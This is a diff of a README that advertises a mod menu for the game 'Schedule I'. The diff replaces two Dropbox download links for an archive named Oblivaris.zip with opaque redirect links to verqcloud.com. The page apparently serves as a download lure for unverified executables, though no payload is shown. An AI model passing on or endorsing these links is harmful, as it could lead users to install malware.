@@ -2,7 +2,7 @@
 
 **Schedule I Mod Menu** is a customizable modding tool designed to enhance your gameplay experience in **Schedule I**. This mod menu provides various features that allow players to modify and tweak different aspects of the game, from character stats to environment changes, giving you full control over your playthrough.
 
-[![Download ScheduleI ModMenu](https://img.shields.io/badge/Download-ScheduleI%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download ScheduleI ModMenu](https://img.shields.io/badge/Download-ScheduleI%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
 
 ## Features
 
@@ -21,4 +21,4 @@
 4. Launch **Schedule I**, and use the hotkey to activate the mod menu and start customizing your experience.
 5. Adjust the settings to your liking for a personalized and enhanced gameplay experience.
 
-[![Download ScheduleI ModMenu](https://img.shields.io/badge/Download-ScheduleI%20ModMenu-blueviolet)](https://www.dropbox.com/scl/fi/zse5cs99mx9h0kjzf06bx/Oblivaris.zip?rlkey=dcargwg0w4py89d285jt5swqo&st=m35upycd&dl=1)
+[![Download ScheduleI ModMenu](https://img.shields.io/badge/Download-ScheduleI%20ModMenu-blueviolet)](https://verqcloud.com?label=09c0d50b1ab5e4e1d163f9d9c8344a8a)
